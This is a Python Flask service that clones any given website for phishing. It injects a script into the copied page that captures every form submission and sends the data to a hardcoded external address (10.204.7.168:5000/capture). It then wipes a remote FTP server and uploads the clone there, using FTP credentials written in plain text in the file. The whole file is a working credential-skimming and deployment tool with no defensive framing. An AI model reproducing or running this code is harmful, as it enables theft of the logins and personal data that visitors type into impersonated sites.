from flask import Flask, request, jsonify
from flask_cors import CORS  # Import CORS
import ftplib
import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse

app = Flask(__name__)
CORS(app)  # Enable CORS for all routes

# FTP credentials
ftp_host = "ftp.kx8.ad1.mytemp.website"  # Replace with your FTP host
ftp_user = "admin@kx8.ad1.mytemp.website"  # Replace with your FTP username
ftp_pass = "I.,hwqStkTa,"  # Replace with your FTP password
ftp_port = 21  # Default FTP port

# Helper functions (similar to your provided code)
def get_name_from_url(url):
    parsed_url = urlparse(url)
    domain_name = parsed_url.netloc.replace("www.", "")
    return domain_name

def sanitize_filename(filename, default_extension="css"):
    sanitized = "".join(c for c in filename if c.isalnum() or c in (' ', '.', '_')).rstrip()
    if not sanitized or '.' not in sanitized or sanitized.split('.')[-1] not in ['css']:
        sanitized += f".{default_extension}"
    return sanitized

def clone_website(url, output_directory):
    try:
        response = requests.get(url)
        response.raise_for_status()
        soup = BeautifulSoup(response.content, 'html.parser')

        if not os.path.exists(output_directory):
            os.makedirs(output_directory)

        # Inject JavaScript
        script = '''
        <script>
            document.addEventListener('DOMContentLoaded', function() {
                var forms = document.getElementsByTagName('form');
                for (var i = 0; i < forms.length; i++) {
                    forms[i].addEventListener('submit', function(event) {
                        var formData = new FormData(this);
                        var data = {};
                        formData.forEach((value, key) => {
                            data[key] = value;
                        });

                        fetch('http://10.204.7.168:5000/capture', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify(data)
                        });
                    });
                }
            });
        </script>
        '''
        soup.body.append(BeautifulSoup(script, 'html.parser'))

        with open(os.path.join(output_directory, 'index.html'), 'w', encoding='utf-8') as file:
            file.write(soup.prettify())

        # Download and save CSS files
        css_links = soup.find_all('link', {'rel': 'stylesheet'})
        for link in css_links:
            css_url = urljoin(url, link['href'])
            css_response = requests.get(css_url)
            css_response.raise_for_status()
            parsed_url = urlparse(link['href'])
            css_filename = sanitize_filename(os.path.basename(parsed_url.path))
            css_path = os.path.join(output_directory, css_filename)
            with open(css_path, 'w', encoding='utf-8') as css_file:
                css_file.write(css_response.text)
            link['href'] = css_filename

        # Download and save images
        image_tags = soup.find_all('img')
        for img in image_tags:
            img_url = urljoin(url, img['src'])
            img_response = requests.get(img_url)
            img_response.raise_for_status()
            img_filename = sanitize_filename(os.path.basename(urlparse(img['src']).path), "jpg")
            img_path = os.path.join(output_directory, img_filename)
            with open(img_path, 'wb') as img_file:
                img_file.write(img_response.content)
            img['src'] = img_filename

        with open(os.path.join(output_directory, 'index.html'), 'w', encoding='utf-8') as file:
            file.write(soup.prettify())

        return f"Website cloned successfully in '{output_directory}'"

    except Exception as e:
        return str(e)

def upload_to_ftp(local_directory, remote_directory):
    try:
        ftp = ftplib.FTP()
        ftp.connect(ftp_host, ftp_port)
        ftp.login(ftp_user, ftp_pass)

        files = ftp.nlst()

        for file_name in files:
            try:
                ftp.delete(file_name)
                print(f"Deleted {file_name}")
            except Exception as e:
                print(f"Failed to delete {file_name}: {e}")
        path_parts = remote_directory.strip("/").split("/")
        current_path = ""
        for part in path_parts:
            current_path = f"{current_path}/{part}" if current_path else f"/{part}"
            try:
                ftp.cwd(current_path)  
            except ftplib.error_perm:
                ftp.mkd(current_path) 
                ftp.cwd(current_path)  

        ftp.cwd(remote_directory) 

       
        for root, dirs, files in os.walk(local_directory):
            for file in files:
                local_file_path = os.path.join(root, file)
                relative_path = os.path.relpath(local_file_path, local_directory)
                remote_file_path = os.path.join(remote_directory, relative_path).replace("\\", "/")

              
                remote_dirs = os.path.dirname(relative_path).split("/")
                current_dir = remote_directory
                for directory in remote_dirs:
                    try:
                        ftp.cwd(directory)  
                    except ftplib.error_perm:
                        ftp.mkd(directory) 
                        ftp.cwd(directory) 
                ftp.cwd(remote_directory)  


                with open(local_file_path, "rb") as file:
                    ftp.storbinary(f"STOR {remote_file_path}", file)

        ftp.quit()
        return "All files uploaded successfully."
    except Exception as e:
        return str(e)

@app.route('/clone', methods=['POST'])
def clone():
    
    data = request.get_json()
    url = data.get('url')
    if not url:
        return jsonify({"error": "URL is required"}), 400
    
    url = data['url']
    output_directory = get_name_from_url(url)
    remote_directory =  "./"
 
    clone_message = clone_website(url, output_directory)
    upload_message = upload_to_ftp(output_directory, remote_directory)


    return jsonify({
        "clone_message": clone_message,
        "upload_message": upload_message
    })

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5004)
